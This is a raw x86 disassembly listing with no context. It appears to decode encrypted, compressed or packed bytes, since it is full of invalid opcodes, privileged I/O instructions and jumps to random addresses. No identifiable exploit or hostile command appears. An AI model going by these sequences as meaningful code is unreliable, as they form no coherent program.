  4068f7:	(bad)  
  4068f8:	ins    DWORD PTR es:[edi],dx
  4068f9:	pop    eax
  4068fa:	ss mov al,0xe9
  4068fd:	inc    edi
  4068fe:	mov    ds:0x1f1f9fd5,al
  406903:	cmp    BYTE PTR [edx-0x4413fd0b],ch
  406909:	sbb    BYTE PTR [ebp+0x66],0x7f
  40690d:	dec    eax
  40690e:	mov    ebx,0x56e97de1
  406913:	dec    edi
  406914:	pushf  
  406915:	bound  ecx,QWORD PTR [edi]
  406917:	std    
  406918:	cmp    eax,0x15d3e0ac
  40691d:	ret    0x3161
  406920:	lods   eax,DWORD PTR ds:[esi]
  406921:	(bad)  
  406922:	cwde   
  406923:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  406925:	and    cl,BYTE PTR [ecx+0x68399bcc]
  40692b:	or     al,0xe8
  40692d:	rcr    dl,1
  40692f:	fidiv  WORD PTR [eax+esi*8+0x30]
  406933:	lahf   
  406934:	ffree  st(4)
  406936:	not    esi
  406938:	aad    0x9d
  40693a:	and    dl,BYTE PTR [ebx]
  40693c:	xor    ecx,DWORD PTR [edi+0x56]
  40693f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406940:	mov    ch,0x8a
  406942:	adc    edx,0xffffffc7
  406945:	xchg   esp,eax
  406946:	sbb    ebp,DWORD PTR [ecx]
  406948:	adc    DWORD PTR [ebx+0x46282f52],esi
  40694e:	xchg   edx,eax
  40694f:	les    ecx,FWORD PTR [ecx-0x69b67c83]
  406955:	out    dx,eax
  406956:	push   0x37a0ca3c
  40695b:	js     0x406900
  40695d:	push   ecx
  40695e:	aas    
  40695f:	push   ds
  406960:	test   DWORD PTR [esi],esi
  406962:	add    ah,dl
  406964:	jmp    0xc3b2de72
  406969:	push   cs
  40696a:	push   ebx
  40696b:	inc    eax
  40696c:	test   DWORD PTR [edi+edi*2],esi
  40696f:	mov    al,BYTE PTR [edx+0x37]
  406972:	mov    al,ds:0xd11d08c4
  406977:	enter  0x8cef,0x39
  40697b:	fisubr DWORD PTR [edx-0x74]
  40697e:	test   DWORD PTR [ebx],esp
  406980:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406981:	mov    eax,0x836f8bff
  406986:	out    dx,al
  406987:	jmp    0x1d6e6327
  40698c:	inc    esp
  40698d:	scas   eax,DWORD PTR es:[edi]
  40698e:	mov    ds,WORD PTR [ebx+0x6a]
  406991:	std    
  406992:	adc    al,0xd1
  406994:	fmul   QWORD PTR [esi]
  406996:	mov    al,0x77
  406998:	xor    al,BYTE PTR [ebp-0x537ebc62]
  40699e:	sub    BYTE PTR [bp+di],dl
  4069a1:	lds    ebx,FWORD PTR [ecx]
  4069a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069a4:	mov    ds:0x680d45de,al
  4069a9:	inc    ecx
  4069aa:	xchg   esp,eax
  4069ab:	retf   0x516f
  4069ae:	jbe    0x406a2a
  4069b0:	inc    esi
  4069b1:	out    dx,al
  4069b2:	in     eax,dx
  4069b3:	and    DWORD PTR [ebx-0x6a],ebp
  4069b6:	and    ch,BYTE PTR [esi]
  4069b8:	jmp    0x2751:0xe5d791a2
  4069bf:	push   ebx
  4069c0:	xor    al,0x55
  4069c2:	outs   dx,DWORD PTR ds:[esi]
  4069c3:	icebp  
  4069c4:	mov    ds:0x679b2baf,eax
  4069c9:	fs xchg ecx,eax
  4069cb:	sti    
  4069cc:	jge    0x40699e
  4069ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069cf:	fst    QWORD PTR [esi+0x6c]
  4069d2:	rol    esp,0xa6
  4069d5:	pop    ss
  4069d6:	shl    BYTE PTR [ebx+0x3c],0x35
  4069da:	lea    esi,[edi-0x12e67c7]
  4069e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069e1:	ret    
  4069e2:	fxch   st(6)
  4069e4:	mov    dl,BYTE PTR [esi+0x11507ea3]
  4069ea:	hlt    
  4069eb:	lahf   
  4069ec:	push   edi
  4069ed:	adc    ebp,0x2c1ad7f1
  4069f3:	in     eax,dx
  4069f4:	ffreep st(0)
  4069f6:	xchg   ecx,eax
  4069f7:	call   0xeaa584ce
  4069fc:	mov    ds:0x3a533179,al
  406a01:	add    esi,DWORD PTR [ebx]
  406a03:	data16 jge 0x406a4a
  406a06:	je     0x406a6f
  406a08:	mov    ch,0xee
  406a0a:	pushf  
  406a0b:	inc    ebx
  406a0c:	lea    ebx,[ebx-0x57d429b7]
  406a12:	(bad)  
  406a13:	outs   dx,DWORD PTR ds:[esi]
  406a14:	add    eax,0xf4117cae
  406a19:	fisttp WORD PTR [esp+eax*2-0x1836eec7]
  406a20:	lds    ecx,FWORD PTR [edx+0x5036a6ee]
  406a26:	pop    edx
  406a27:	imul   edx,DWORD PTR [esi+edx*1],0xffffffdd
  406a2b:	test   ax,0x179d
  406a2f:	push   edx
  406a30:	data16 sbb BYTE PTR [edi+0x2f102cee],bl
  406a37:	rcr    DWORD PTR [esi-0x27],1
  406a3a:	arpl   WORD PTR [ebp+0x12],bx
  406a3d:	stos   DWORD PTR es:[edi],eax
  406a3e:	xchg   ebx,eax
  406a3f:	sbb    eax,edi
  406a41:	push   edi
  406a42:	js     0x406a6a
  406a44:	sbb    DWORD PTR [edx],0x75
  406a47:	out    0x81,eax
  406a49:	iret   
  406a4a:	hlt    
  406a4b:	adc    DWORD PTR [ecx],0x1
  406a4e:	outs   dx,BYTE PTR ds:[esi]
  406a4f:	inc    edx
  406a50:	rep lods eax,DWORD PTR ds:[esi]
  406a52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a53:	mov    ebp,0x591f5f0e
  406a58:	in     eax,dx
  406a59:	inc    ecx
  406a5a:	or     bl,BYTE PTR [ecx]
  406a5c:	(bad)  
  406a5e:	or     eax,0x58d8bea8
  406a63:	push   ss
  406a64:	dec    esi
  406a65:	xor    al,0x8a
  406a67:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  406a69:	icebp  
  406a6a:	sbb    ebp,DWORD PTR [esi]
  406a6c:	out    0x66,al
  406a6e:	loope  0x406a6b
  406a70:	inc    eax
  406a71:	sbb    edi,DWORD PTR [edi-0x3b]
  406a74:	add    BYTE PTR [eax-0x46],0xb4
  406a78:	out    0xaa,al
  406a7a:	and    eax,0x640f2965
  406a7f:	xor    ebx,DWORD PTR [ebp+0x68]
  406a82:	shl    DWORD PTR [eax],cl
  406a84:	mov    cl,0xdf
  406a86:	xchg   esi,eax
  406a87:	xor    ebp,DWORD PTR [ebp-0x66]
  406a8a:	aam    0x28
  406a8c:	mov    esp,cr6
  406a8f:	in     eax,dx
  406a90:	ficom  WORD PTR ds:0x81d32548
  406a96:	sbb    eax,0x1ae6809f
  406a9b:	stc    
  406a9c:	ins    DWORD PTR es:[edi],dx
  406a9d:	ins    DWORD PTR es:[edi],dx
  406a9e:	dec    esi
  406a9f:	les    ecx,FWORD PTR [esi+0x6d]
  406aa2:	mov    edi,DWORD PTR [ebx]
  406aa4:	(bad)  
  406aa5:	pop    ebp
  406aa6:	out    dx,al
  406aa7:	jno    0x406ac9
  406aa9:	mov    DWORD PTR [ebp+0x63ccf478],edi
  406aaf:	cld    
  406ab0:	push   edx
  406ab1:	xchg   esp,eax
  406ab2:	jae    0x406b12
  406ab4:	dec    DWORD PTR [edx+0x51bc283a]
  406aba:	fisttp QWORD PTR [esi-0x29]
  406abd:	ja     0x406a86
  406abf:	daa    
  406ac0:	cmp    BYTE PTR [ebx+0x17fd6ae1],ah
  406ac6:	add    eax,0x45fcbdc6
  406acb:	cmc    
  406acc:	fild   QWORD PTR [ecx+0x3b7c3305]
  406ad2:	cwde   
  406ad3:	push   ss
  406ad4:	push   ebx
  406ad5:	pushf  
  406ad6:	enter  0x3e95,0x4c
  406ada:	(bad)  
  406adb:	stos   BYTE PTR es:[edi],al
  406adc:	(bad)
  406ae0:	pop    edx
  406ae1:	mov    ds:0x7d2347a6,eax
  406ae6:	sbb    BYTE PTR [ebx-0x71620661],bh
  406aec:	not    BYTE PTR [ecx+0x53]
  406aef:	xor    DWORD PTR cs:[ebp+0x71a9a38d],esp
  406af6:	test   eax,0xefd5816d
  406afb:	or     al,0xf9
  406afd:	cdq    
  406afe:	lea    edx,[ebp-0x7]
  406b01:	fcomp  DWORD PTR [eax]
  406b03:	cwde   
  406b04:	inc    ebp
  406b05:	mov    ecx,0x8385d3ab
  406b0a:	mov    esp,0x9b1f2d57
  406b0f:	xchg   eax,ebx
  406b11:	jae    0x406b58
  406b13:	xchg   esp,eax
  406b14:	jl     0x406b17
  406b16:	es xor al,0xdc
  406b19:	sbb    eax,0x8b08f6ff
  406b1e:	cs pop eax
  406b20:	jmp    0x167d5499
  406b25:	add    ebx,DWORD PTR ds:0x35f6a2d2
  406b2b:	inc    ebx
  406b2c:	cli    
  406b2d:	js     0x406ace
  406b2f:	stc    
  406b30:	cmp    eax,0xb69be453
  406b35:	push   edi
  406b36:	fstp   DWORD PTR [esi]
  406b38:	mov    ebp,0xb9f319dd
  406b3d:	jp     0x406b6f
  406b3f:	ret    
  406b40:	pusha  
  406b41:	in     eax,0x3e
  406b43:	xchg   esi,eax
  406b44:	fwait
  406b45:	push   eax
  406b46:	xor    eax,0xf4a93ede
  406b4b:	adc    eax,ebx
  406b4d:	js     0x406ae1
  406b4f:	jno    0x406b50
  406b51:	shl    BYTE PTR [ecx-0x29],1
  406b54:	pop    esp
  406b55:	mov    esp,0x814147a9
  406b5a:	mov    ch,0xa7
  406b5c:	ins    DWORD PTR es:[edi],dx
  406b5d:	pop    ecx
  406b5e:	adc    esp,esp
  406b60:	sbb    eax,0x2b1f3f28
  406b65:	outs   dx,DWORD PTR ds:[esi]
  406b66:	jecxz  0x406baf
  406b68:	leave  
  406b69:	outs   dx,BYTE PTR ds:[esi]
  406b6a:	mov    esp,0x21f6f18f
  406b6f:	pop    ebp
  406b70:	push   0x51
  406b72:	in     al,dx
  406b73:	jo     0x406bad
  406b75:	pop    es
  406b76:	rcl    cl,1
  406b78:	and    DWORD PTR [eax],0xeb42da9b
  406b7e:	xchg   ebp,eax
  406b7f:	inc    esi
  406b80:	mov    eax,0xe4334889
  406b85:	shl    ebx,cl
  406b87:	lods   eax,DWORD PTR ds:[esi]
  406b88:	popa   
  406b89:	enter  0xee21,0x53
  406b8d:	push   ebp
  406b8e:	mov    eax,0xd4fb8441
  406b93:	sbb    BYTE PTR [esi-0x664c8eac],dh
  406b99:	pop    edx
  406b9a:	inc    edi
  406b9b:	dec    esi
  406b9c:	xchg   esi,eax
  406b9d:	sbb    DWORD PTR [edx+0x30],ebx
  406ba0:	clc    
  406ba1:	in     al,dx
  406ba2:	xlat   BYTE PTR ds:[ebx]
  406ba3:	adc    dh,BYTE PTR [eax-0x11977374]
  406ba9:	pop    ss
  406baa:	jmp    0x406b9e
  406bac:	pop    edx
  406bad:	jge    0x406bf3
  406baf:	push   ecx
  406bb0:	xchg   ebp,eax
  406bb1:	and    al,BYTE PTR [edi]
  406bb3:	stos   BYTE PTR es:[edi],al
  406bb4:	out    0xc,eax
  406bb6:	mov    ebx,0x79dbf075
  406bbb:	pusha  
  406bbc:	xor    al,dl
  406bbe:	pushf  
  406bbf:	loope  0x406bea
  406bc1:	cmp    DWORD PTR [ecx+0x192193f8],esi
  406bc7:	pop    eax
  406bc8:	jo     0x406c1c
  406bca:	push   0x4fdb76ec
  406bcf:	lods   eax,DWORD PTR ds:[esi]
  406bd0:	xor    al,0xb6
  406bd2:	call   0xe88c:0x20b1b036
  406bd9:	dec    ebp
  406bda:	int3   
  406bdb:	out    0x3,eax
  406bdd:	clc    
  406bde:	sar    BYTE PTR [eax],cl
  406be0:	inc    ebx
  406be1:	sub    DWORD PTR [eax+0x3b],0x74
  406be5:	sbb    ah,BYTE PTR [ecx+0x8618b2f]
  406beb:	jl     0x406c2b
  406bed:	pop    ecx
  406bee:	stc    
  406bef:	mov    dl,0xa9
  406bf1:	cli    
  406bf2:	push   0x37
  406bf4:	pop    es
  406bf5:	dec    ebp
  406bf6:	call   0xdb7d:0xc3ea021b
  406bfd:	dec    esi
  406bfe:	add    DWORD PTR [esp+eax*8+0x3a4f6976],edx
  406c05:	jb     0x406c12
  406c07:	repnz test BYTE PTR [esp+eax*8+0x8],al
  406c0c:	jne    0x406bc4
  406c0e:	xchg   ecx,eax
  406c0f:	call   FWORD PTR [edx+0x79d8abab]
  406c15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c16:	cmp    bl,dl
  406c18:	and    edx,0xffffffb5
  406c1b:	call   0x6f03:0xdb9cdaed
  406c22:	adc    edx,DWORD PTR [eax-0x5d0be677]
  406c28:	xor    al,BYTE PTR [edi-0x7766a4a8]
  406c2e:	cmp    edi,DWORD PTR [eax-0xcf915db]
  406c34:	aaa    
  406c35:	aam    0x71
  406c37:	in     eax,dx
  406c38:	(bad)  
  406c39:	rcl    BYTE PTR [edx+0x21],1
  406c3c:	(bad)  
  406c3d:	in     al,0x77
  406c3f:	stc    
  406c40:	data16 clc 
  406c42:	enter  0xfa54,0x6a
  406c46:	and    bl,al
  406c48:	dec    esp
  406c49:	leave  
  406c4a:	jmp    0x5a06:0xff7a6726
  406c51:	dec    edx
  406c52:	xchg   DWORD PTR [esi],eax
  406c54:	jg     0x406cb9
  406c56:	mov    bl,0x27
  406c58:	xor    esp,DWORD PTR [ebp-0x3b]
  406c5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c5c:	ins    DWORD PTR es:[edi],dx
  406c5d:	bound  ebx,QWORD PTR [edi]
  406c5f:	cs in  eax,dx
  406c61:	add    DWORD PTR [ebp-0x7239ab2f],ebp
  406c67:	adc    al,0x3e
  406c69:	jl     0x406c0b
  406c6b:	mov    bl,0xaa
  406c6d:	inc    ebx
  406c6e:	outs   dx,DWORD PTR ds:[esi]
  406c6f:	pop    esp
  406c70:	mov    DWORD PTR [edx],eax
  406c72:	sbb    al,0xe6
  406c74:	cmp    eax,0x2c1aab0f
  406c79:	pop    eax
  406c7a:	mov    dh,BYTE PTR [eax+esi*8+0x25548eb4]
  406c81:	loope  0x406c43
  406c83:	std    
  406c84:	jl     0x406ce3
  406c86:	pusha  
  406c87:	pusha  
  406c88:	push   ss
  406c89:	cmp    edi,DWORD PTR [ebp-0x66]
  406c8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c8d:	xchg   BYTE PTR [ebp+0xeaa6e88],ah
  406c93:	cli    
  406c94:	test   eax,0xd8f57b78
  406c99:	arpl   cx,dx
  406c9b:	mov    DWORD PTR [esi+0x2b],ebp
  406c9e:	xor    al,0x2a
  406ca0:	adc    al,0xc
  406ca2:	dec    esi
  406ca3:	jmp    0x9f3e4be1
  406ca8:	xor    eax,0x62eb5546
  406cad:	xchg   edi,eax
  406cae:	into   
  406caf:	pop    esp
  406cb0:	jge    0x406ca1
  406cb2:	fs inc ebp
  406cb4:	aaa    
  406cb5:	add    ebx,edi
  406cb7:	pop    es
  406cb8:	push   eax
  406cb9:	daa    
  406cba:	jnp    0x406d26
  406cbc:	inc    edx
  406cbd:	dec    esp
  406cbe:	inc    ecx
  406cbf:	push   ds
  406cc0:	test   al,0xc5
  406cc2:	lods   al,BYTE PTR ds:[esi]
  406cc3:	jp     0x406c83
  406cc5:	sbb    eax,0xd738ef70
  406cca:	xchg   edx,eax
  406ccb:	pop    ss
  406ccc:	mov    dl,0x78
  406cce:	loop   0x406ce1
  406cd0:	cmp    ah,bh
  406cd2:	dec    edi
  406cd3:	lea    ebx,[esi+0x65]
  406cd6:	loop   0x406d1c
  406cd8:	shr    edx,cl
  406cda:	jbe    0x406cbc
  406cdc:	sub    BYTE PTR [edx],bl
  406cde:	dec    edi
  406cdf:	xchg   edx,eax
  406ce0:	push   0x105a051b
  406ce5:	ror    BYTE PTR [ecx+ecx*2-0x53],1
  406ce9:	popf   
  406cea:	mov    dl,0x20
  406cec:	in     eax,dx
  406ced:	adc    eax,0x246b26e2
  406cf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cf3:	das    
  406cf4:	jo     0x406c7b
  406cf6:	aas    
  406cf7:	mov    BYTE PTR fs:[eax-0x8],bl
  406cfb:	xchg   esp,eax
  406cfc:	je     0x406d3c
  406cfe:	sub    DWORD PTR [edi+0x2b],edi
  406d01:	(bad)  
  406d03:	bound  ebx,QWORD PTR [eax+0x60]
  406d06:	in     eax,0xa7
  406d08:	pop    ds
  406d09:	mov    ds:0xe5a94eff,eax
  406d0e:	jge    0x406d79
  406d10:	in     al,dx
  406d11:	sub    dl,BYTE PTR [ecx]
  406d13:	mov    ecx,0x2d0a0d83
  406d18:	call   0xf80e:0x696753fd
  406d1f:	and    al,0x10
  406d21:	xor    ch,BYTE PTR [ebx]
  406d23:	fidiv  DWORD PTR [eax-0x373b99df]
  406d29:	sbb    BYTE PTR [eax-0x5ef0750e],bh
  406d2f:	(bad)  [ecx+eiz*4+0x71]
  406d33:	push   0x1
  406d35:	mov    ebx,0xb942b9d3
  406d3a:	add    BYTE PTR [esp+edx*1-0x54],ah
  406d3e:	xor    DWORD PTR [ebx-0x73abce37],edi
  406d44:	(bad)  
  406d45:	jmp    0xd49b1b3d
  406d4a:	sbb    ecx,0xe96fe17
  406d50:	inc    ebx
  406d51:	mov    esi,0x40c0558
  406d56:	inc    edi
  406d57:	sbb    dl,0x8
  406d5a:	(bad)  
  406d5b:	pop    ebx
  406d5c:	out    0x3b,al
  406d5e:	xchg   ebx,eax
  406d5f:	sbb    dl,BYTE PTR [edx-0x33]
  406d62:	ja     0x406d3b
  406d64:	mul    DWORD PTR [ebx-0x26]
  406d67:	xor    esp,ebx
  406d69:	fcomip st,st(5)
  406d6b:	push   0xffffffa1
  406d6d:	inc    ebp
  406d6e:	gs gs int3 
  406d71:	popf   
  406d72:	add    eax,0x5d9e420a
  406d77:	inc    ecx
  406d78:	mov    al,0x83
  406d7a:	pop    eax
  406d7b:	dec    edi
  406d7c:	jg     0x406d43
  406d7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d7f:	imul   DWORD PTR [esi+0x51]
  406d82:	scas   eax,DWORD PTR es:[edi]
  406d83:	add    BYTE PTR [esp+edx*1-0x73da55ed],dh
  406d8a:	xor    DWORD PTR [ebp+0x52],esi
  406d8d:	nop
  406d8e:	fisttp DWORD PTR [ebx-0x45]
  406d91:	cmp    al,0x5e
  406d93:	je     0x406d6a
  406d95:	push   0xbef20fb1
  406d9a:	xchg   esp,eax
  406d9b:	leave  
  406d9c:	std    
  406d9d:	into   
  406d9e:	outs   dx,BYTE PTR ds:[esi]
  406d9f:	inc    eax
  406da0:	mov    al,ds:0x187bb87c
  406da5:	push   es
  406da6:	in     eax,0x4a
  406da8:	leave  
  406da9:	aad    0x16
  406dab:	es std 
  406dad:	call   0x91451fa5
  406db2:	ffreep st(7)
  406db4:	sub    eax,0xc826edcb
  406db9:	inc    ebp
  406dba:	call   0xfb3c5e10
  406dbf:	lock ret 0x8211
  406dc3:	mov    cl,0xc8
  406dc5:	(bad)
  406dc9:	sbb    WORD PTR [ebx+0x562728ac],dx
  406dd0:	adc    eax,0xd8cf0828
  406dd5:	ss and al,0x7b
  406dd8:	xchg   ebp,eax
  406dd9:	nop
  406dda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ddb:	cmc    
  406ddc:	mov    ds:0x7b0a784a,al
  406de1:	xchg   esi,eax
  406de2:	(bad)  [eax]
  406de4:	cdq    
  406de5:	ret    0xd675
  406de8:	popf   
  406de9:	ja     0x406e56
  406deb:	jge    0x406dc4
  406ded:	test   eax,0xc2c8627e
  406df2:	int3   
  406df3:	pop    ss
  406df4:	jb     0x406dad
  406df6:	push   ds
  406df7:	jmp    0x406e03
  406df9:	dec    edi
  406dfa:	lahf   
  406dfb:	sar    DWORD PTR [esi-0x2edfef7f],1
  406e01:	jns    0x406d90
  406e03:	pop    ebp
  406e04:	adc    ebp,DWORD PTR [ecx-0x17]
  406e07:	ja     0x406e69
  406e09:	cmp    cl,ch
  406e0b:	push   edi
  406e0c:	add    BYTE PTR [esi-0x27],dh
  406e0f:	pop    ebx
  406e10:	xor    bh,dl
  406e12:	xchg   edx,eax
  406e13:	fidiv  WORD PTR [esi-0x2536ba66]
  406e19:	mov    bl,0xc2
  406e1b:	push   cs
  406e1c:	stos   BYTE PTR es:[edi],al
  406e1d:	ds inc eax
  406e1f:	or     DWORD PTR [edx],ecx
  406e21:	add    eax,0xefdbcbca
  406e26:	call   0xf0fa6db7
  406e2b:	jns    0x406e86
  406e2d:	sar    DWORD PTR [esi-0x5e],cl
  406e30:	sti    
  406e31:	outs   dx,BYTE PTR ds:[esi]
  406e32:	in     eax,dx
  406e33:	(bad)  
  406e34:	sbb    DWORD PTR [ecx+0x6cf23412],ebx
  406e3a:	pushf  
  406e3b:	dec    ebx
  406e3c:	dec    ebx
  406e3d:	sub    bh,BYTE PTR [esi+0x81f3685]
  406e43:	(bad)  
  406e44:	fimul  DWORD PTR [edx-0x463725c5]
  406e4a:	mov    edx,DWORD PTR [edx+eax*4+0x5e]
  406e4e:	push   ss
  406e4f:	cli    
  406e50:	add    edx,DWORD PTR [ebx+0x6bdc60d5]
  406e56:	das    
  406e57:	jge    0x406e5f
  406e59:	repnz xchg esi,eax
  406e5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e5c:	dec    ecx
  406e5d:	loope  0x406e83
  406e5f:	inc    ebx
  406e60:	xchg   bl,dh
  406e62:	(bad)  
  406e63:	sub    eax,0x44114d53
  406e68:	lock daa 
  406e6a:	pushf  
  406e6b:	mov    bl,0xed
  406e6d:	inc    edi
  406e6e:	xchg   edi,eax
  406e6f:	and    BYTE PTR [edx],dh
  406e71:	jecxz  0x406ea6
  406e73:	xchg   edi,eax
  406e74:	push   edi
  406e75:	fild   QWORD PTR [eax+0x7d]
  406e78:	js     0x406eef
  406e7a:	fwait
  406e7b:	and    bh,BYTE PTR [edx-0x46f33328]
  406e81:	pusha  
  406e82:	mov    dl,0x8b
  406e84:	lds    ecx,FWORD PTR [esp+esi*2+0x16f101da]
  406e8b:	pop    ss
  406e8c:	fcomp  DWORD PTR gs:[ecx+0x1884a8a5]
  406e93:	inc    ecx
  406e94:	inc    edi
  406e95:	aad    0x3f
  406e97:	add    ebx,DWORD PTR [esi+0x6e]
  406e9a:	mov    dl,0xc7
  406e9c:	test   al,0x22
  406e9e:	mov    ebp,0xaf27cc5
  406ea3:	add    al,0x18
  406ea5:	jle    0x406e35
  406ea7:	push   0x87988507
  406eac:	push   ss
  406ead:	repz fidivr DWORD PTR [ebx+eiz*4-0x6f]
  406eb2:	fsub   DWORD PTR [edx+esi*1]
  406eb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406eb6:	sbb    al,0xcc
  406eb8:	jmp    0xcccbf299
  406ebd:	jno    0x406efa
  406ebf:	jp     0x406ec7
  406ec1:	js     0x406f3d
  406ec3:	and    BYTE PTR [ebx+edx*1],dl
  406ec6:	jno    0x406f3d
  406ec8:	out    0x91,al
  406eca:	addr16 dec esi
  406ecc:	retf   0xe26c
  406ecf:	iret   
  406ed0:	jmp    0xbec5cb18
  406ed5:	push   ecx
  406ed6:	(bad)  
  406ed7:	(bad)  
  406ed9:	push   0x55635edd
  406ede:	push   0xb5700ed0
  406ee3:	push   ebp
  406ee4:	xchg   ecx,eax
  406ee5:	fadd   DWORD PTR [ebp+esi*4+0x42f02dac]
  406eec:	mov    dl,0xa7
  406eee:	push   0xffffffb7
  406ef0:	jnp    0x406e85
  406ef2:	imul   eax,DWORD PTR [ebx-0x3],0x75d03ba3
  406ef9:	or     dh,ch
  406efb:	xlat   BYTE PTR ds:[ebx]
  406efc:	or     ebx,esi
  406efe:	leave  
  406eff:	jp     0x406ed1
  406f01:	out    0x47,al
  406f03:	mov    eax,DWORD PTR [esi-0x39]
  406f06:	cdq    
  406f07:	ins    DWORD PTR es:[edi],dx
  406f08:	repnz dec ecx
  406f0a:	rcl    BYTE PTR [eax],cl
  406f0c:	outs   dx,DWORD PTR ds:[esi]
  406f0d:	dec    edx
  406f0e:	xor    DWORD PTR [ecx],ecx
  406f10:	stos   BYTE PTR es:[edi],al
  406f11:	stc    
  406f12:	pop    ss
  406f13:	add    cl,BYTE PTR [ebx-0x437c235]
  406f19:	pop    esi
  406f1a:	test   BYTE PTR [ebp-0x571eaa50],0x6b
  406f21:	xor    eax,0x63f9ce72
  406f26:	or     eax,0x9b2ed45
  406f2b:	xlat   BYTE PTR ds:[ebx]
  406f2c:	test   eax,0x6f3c3f3d
  406f31:	xor    al,0x70
  406f33:	outs   dx,DWORD PTR ds:[esi]
  406f34:	inc    DWORD PTR [esi-0x27]
  406f37:	dec    esp
  406f38:	es mov eax,0x77cad316
  406f3e:	mov    eax,0x5c43ba3c
  406f43:	sbb    al,BYTE PTR [edx]
  406f45:	or     BYTE PTR [ebx-0x33],cl
  406f48:	stc    
  406f49:	pop    ecx
  406f4a:	mov    bl,0x49
  406f4c:	inc    ecx
  406f4d:	fisubr DWORD PTR [edi]
  406f4f:	dec    esp
  406f50:	inc    eax
  406f51:	imul   ebx,DWORD PTR [esi],0xa851d386
  406f57:	jmp    0x7434:0x49f5066a
  406f5e:	aam    0x6f
  406f60:	xor    DWORD PTR [esi+0x38],0x651d0231
  406f67:	in     al,0x76
  406f69:	and    ebx,ebx
  406f6b:	push   edx
  406f6c:	rcr    BYTE PTR [eax],0x8e
  406f6f:	xchg   esp,eax
  406f70:	sbb    esp,esi
  406f72:	std    
  406f73:	arpl   WORD PTR ds:0xaffed0d5,cx
  406f79:	loopne 0x406fdc
  406f7b:	jnp    0x406f9b
  406f7d:	push   ebp
  406f7e:	sahf   
  406f7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f80:	js     0x406f78
  406f82:	sbb    BYTE PTR [edx],cl
  406f84:	xchg   DWORD PTR [edi+0x22],ebp
  406f87:	pop    ecx
  406f88:	add    al,0xaa
  406f8a:	xchg   ebp,eax
  406f8b:	sub    al,0x3f
  406f8d:	push   ecx
  406f8e:	inc    edx
  406f8f:	sub    eax,0x186f5f78
  406f94:	adc    edx,ebx
  406f96:	and    esp,DWORD PTR [esp+ebx*1]
  406f99:	mov    eax,0x6dfece14
  406f9e:	pop    esp
  406f9f:	aaa    
  406fa0:	push   edi
  406fa1:	cmp    bl,al
  406fa3:	cwde   
  406fa4:	mov    eax,0xbed9c1c2
  406fa9:	pop    ebp
  406faa:	loope  0x406f71
  406fac:	leave  
  406fad:	cmp    ebp,DWORD PTR [ecx+eax*8-0x34]
  406fb1:	das    
  406fb2:	mov    eax,0x2c7bd274
  406fb7:	xor    al,BYTE PTR [esi-0x4c4b3c65]
  406fbd:	loop   0x406fe9
  406fbf:	sub    esp,esp
  406fc1:	pop    eax
  406fc2:	in     eax,0xb7
  406fc4:	out    0x12,eax
  406fc6:	(bad)  [eax-0x37]
  406fc9:	xlat   BYTE PTR ds:[ebx]
  406fca:	jns    0x406f5f
  406fcc:	stc    
  406fcd:	or     bl,BYTE PTR ds:0x9a8802b
  406fd3:	push   esp
  406fd4:	pop    esi
  406fd5:	xchg   edi,eax
  406fd6:	out    dx,eax
  406fd7:	(bad)  
  406fd8:	xor    edi,DWORD PTR [ebx]
  406fda:	cld    
  406fdb:	int    0x31
  406fdd:	int3   
  406fde:	jmp    0xcb41104c
  406fe3:	and    DWORD PTR [edx+esi*1],edi
  406fe6:	xchg   ebp,eax
  406fe7:	fs enter 0xe450,0xd5
  406fec:	ja     0x407008
  406fee:	xlat   BYTE PTR ds:[ebx]
  406fef:	fisttp DWORD PTR [edi+0x75]
  406ff2:	pop    edx
  406ff3:	dec    edx
  406ff4:	stos   DWORD PTR es:[edi],eax
  406ff5:	pop    esi
  406ff6:	add    BYTE PTR [edi-0x53],0xf
  406ffa:	(bad)  
  406ffb:	cmc    
  406ffc:	or     eax,0xbe126a37
  407001:	jb     0x407005
  407003:	ret    
  407004:	in     al,0xf1
  407006:	iret   
  407007:	add    DWORD PTR [edi+0x5d2b406c],eax
  40700d:	mov    eax,0x90265bbc
  407012:	(bad)  
  407013:	xor    eax,0x4566555e
  407018:	jle    0x407060
  40701a:	or     BYTE PTR [ebp+0x521c7173],dh
  407020:	fsub   DWORD PTR [ebp+esi*2-0x7f]
  407024:	xor    eax,0x2b993030
  407029:	out    0x24,al
  40702b:	mov    ch,0x99
  40702d:	mov    ch,0x33
  40702f:	pop    eax
  407030:	stc    
  407031:	mov    es,WORD PTR [eax-0x4832eb7e]
  407037:	lock and DWORD PTR [edi+0x7e96e80b],ecx
  40703e:	cwde   
  40703f:	sbb    dl,ah
  407041:	and    eax,esp
  407043:	nop
  407044:	cwde   
  407045:	jecxz  0x40700d
  407047:	(bad)  
  40704a:	ins    BYTE PTR es:[edi],dx
  40704b:	mov    ah,0x48
  40704d:	in     al,0xbb
  40704f:	push   ecx
  407050:	test   ah,bh
  407052:	mov    eax,0xcfe0ed09
  407057:	dec    edi
  407058:	add    al,0xe0
  40705a:	jle    0x40706b
  40705c:	js     0x40700d
  40705e:	cli    
  40705f:	pop    ebx
  407060:	lds    ecx,FWORD PTR [ecx-0x7014bd59]
  407066:	xor    edx,DWORD PTR [edx]
  407068:	(bad)  [ebx-0x44]
  40706b:	cmp    bl,bl
  40706d:	iret   
  40706e:	jae    0x407042
  407070:	mov    ebp,0x3ae1ba1a
  407075:	xchg   edi,eax
  407076:	inc    eax
  407077:	mov    eax,ds:0x3f46559d
  40707c:	test   esi,esp
  40707e:	imul   edi,ecx,0x76
  407081:	fistp  DWORD PTR [ecx-0x80]
